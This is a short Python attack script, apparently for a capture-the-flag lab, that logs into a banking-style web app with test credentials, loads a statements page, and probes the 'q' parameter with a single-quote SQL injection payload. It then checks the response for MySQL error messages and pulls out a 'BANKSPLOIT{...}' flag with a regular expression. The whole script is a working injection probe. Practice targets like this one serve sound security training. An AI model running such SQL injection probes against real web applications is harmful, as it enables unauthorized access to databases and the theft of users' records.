#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'email': 'alice@example.com',
        'password': 'password123'
    }).encode()
    req = urllib.request.Request(login_url, data=login_data, method='POST')
    opener.open(req, timeout=10)
    print("[+] Logged in")

    # Access statements to trigger seeding
    req = urllib.request.Request(f"{url_base}/statements")
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')
    print("[+] Statements page loaded")

    # Check if seeding worked - look for flag in HTML
    if 'BANKSPLOIT{' in html:
        print("[+] Flag visible in statements page (might be cached)")
    else:
        print("[-] No flag in statements page yet")

    # Try basic error payload
    payload = "x'"
    url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    if 'syntax error' in html.lower() or 'mysql' in html.lower():
        print("[+] SQL error detected - injection point works!")

    if 'BANKSPLOIT{' in html:
        import re
        match = re.search(r'BANKSPLOIT\{[A-F0-9]{12}\}', html)
        if match:
            print(f"[+] FLAG FOUND: {match.group(0)}")
        else:
            print("[-] BANKSPLOIT text found but wrong format")
    else:
        print("[-] No BANKSPLOIT in response")

except Exception as e:
    print(f"Error: {e}")
